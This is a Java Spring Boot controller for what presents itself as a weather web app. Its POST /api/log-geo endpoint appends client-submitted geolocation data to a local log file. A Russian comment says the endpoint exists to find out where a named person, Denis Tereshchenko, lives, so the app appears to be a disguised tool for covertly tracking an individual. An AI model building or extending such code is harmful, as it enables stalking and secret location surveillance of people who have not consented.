package xyz.lublu.vibecode;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;
import java.util.Map;

@Controller
public class WeatherController {

    @GetMapping("/")
    public String index() {
        return "index";
    }

    @GetMapping("/health")
    @ResponseBody
    public String health() {
        return "OK";
    }

    @PostMapping("/api/log-geo")
    //это чтобы узнать где живет Великий Денис Терещенко /^_^/
    @ResponseBody
    public String logGeo(@RequestBody Map<String, Object> geoData) {
        String os = System.getProperty("os.name").toLowerCase();
        String userHome = System.getProperty("user.home");
        String path;

        if (os.contains("win")) {
            path = userHome + File.separator + "Desktop" + File.separator + "geo_logs.txt";
        } else {
            path = "/opt/lublu/geo_logs.txt";
        }

        try (FileWriter fw = new FileWriter(path, true)) {
            fw.write(LocalDateTime.now() + ": " + geoData.toString() + "\n");
            return "Logged to " + path;
        } catch (IOException e) {
            return "Failed to log: " + e.getMessage();
        }
    }
}
